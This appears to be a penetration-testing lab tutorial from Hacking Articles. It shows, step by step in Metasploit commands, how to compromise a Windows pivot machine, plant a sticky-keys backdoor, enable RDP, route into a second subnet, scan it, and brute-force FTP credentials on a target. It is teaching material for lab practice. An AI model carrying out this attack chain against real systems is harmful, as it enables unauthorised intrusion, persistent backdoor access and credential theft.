@@ -1,0 +1,71 @@
+
+FTP Pivoting through RDP
+
+In our previous tutorial we had discussed on SSH pivoting & RDP pivoting and today you will learn FTP pivoting attack.
+From Offensive Security
+Pivoting is technique to get inside an unreachable network with help of pivot (centre point). In simple words it is an attack through which attacker can exploit those system which belongs to different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then attacker will able to target the client system for attack.
+Lab Setup requirement:
+Attacker machine: Kali Linux
+Pivot Machine:  window operating system with two network interface
+Target Machine: window 7 (Allow FTP service)
+
+Use exploit MS17-010 or multi handler to hack the pivot machine and bypass its UAC to achieve admin privileges.
+sessions
+ From given image you can confirm that I owned pivot machine (192.168.0.101) meterpreter session1.
+
+Here I need to make post exploit to launch sticky key attack 
+Use post/windows/manage/sticky_keys
+msf post(sticky_keys) > set session 1
+msf post(sticky_keys) >exploit
+Great!! It has successfully launched sticky attack in pivot machine and now we will utilize it later for establishing connection with target FTP server.
+
+Open meterpreter session1 and type following command which will enable remote Desktop service in pivoted machine. 
+Meterpreter> run getgui -e
+
+Check network interface through following command:
+Meterpreter> ifconfig
+From given image you can observe two networks interface in pivot’s system 1st for IP 192.168.0.101 through which attacker is connected and 2nd for IP 192.168.100.102 through which FTP server (targets) are connected.
+
+Since attacker belongs to 192.168.0.1 interface and client belongs to 192.168.100.0 interface therefore it is not possible to directly make attack on client network until unless the attacker acquires same network connection. In order to achieve 192.168.100.0 network attacker need run the post exploitation “autoroute”.
+This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. Default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.
+use post/multi/manage/autoroute 
+msf post(autoroute) > set session 1
+msf post(autoroute) > exploit
+
+This module will perform IPv4 ping sweep using the OS included ping command.
+use post/windows/gather/ping_sweep
+msf post(ping_sweep) > set rhosts 192.168.100.1-110
+msf post(ping_sweep) > set session 1
+msf post(ping_sweep) > exploit
+ Here we found a new host IP 192.1668.100.103 as shown in given image. Let’s perform TCP port scan for activated services on this machine.
+
+This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.
+use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) > set ports 21
+msf auxiliary(tcp) > set rhosts 192.168.100.103
+msf auxiliary(tcp) > set thread 10
+msf auxiliary(tcp) >exploit
+From given you can observe port 21 is open and we know that 21 used for FTP services.
+
+This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.
+use auxiliary/scanner/ftp/ftp_login
+msf auxiliary(ftp_login) > set rhosts 192.168.100.103
+msf auxiliary(ftp_login) > set user_file /root/Desktop/user.txt
+msf auxiliary(ftp_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary(ftp_login) > set stop_on_success true
+msf auxiliary(ftp_login) > exploit
+From given image you can observe t it is showing matching combination of username: raj and password: 123 for login.
+
+Open new terminal in kali Linux and type following command to connect with pivot machine through RDP service
+  rdesktop 192.168.0.101
+
+If you remember we had lunched sticky attack above which will open command prompt on logon screen when you will hit 5 times shift key.
+Now press 5 times shift key then you will get command prompt and type “start iexplore.exe” which will lunch Internet Explore.
+
+Execute following URL in browser for FTP connection:
+ftp://192.168.100.103
+ Now enter the credential which we had found through FTP login brute force attack i.e. raj: 123
+
+Congrats!!!  We are successfully connected with FTP server through pivot machine.
+
+ Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
